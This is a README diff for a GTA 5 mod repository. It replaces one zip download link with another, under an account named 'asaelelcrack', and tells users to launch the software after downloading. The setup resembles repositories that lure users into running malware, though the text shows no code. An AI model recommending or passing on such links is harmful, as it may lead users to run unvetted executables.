@@ -17,7 +17,7 @@ Welcome to the Mod-Gta5 repository! If you're looking to take your GTA 5 gamepla
 
 ## 🔗 Download the Software
 
-📥 [Download Here!](https://github.com/user-attachments/files/18383251/Software.zip) 📥
+📥 [Download Here!](https://github.com/asaelelcrack/Mod-Gta5/releases/download/v2.0/Release_x64.zip) 📥
 
 *Note: The software needs to be launched after downloading.*
 
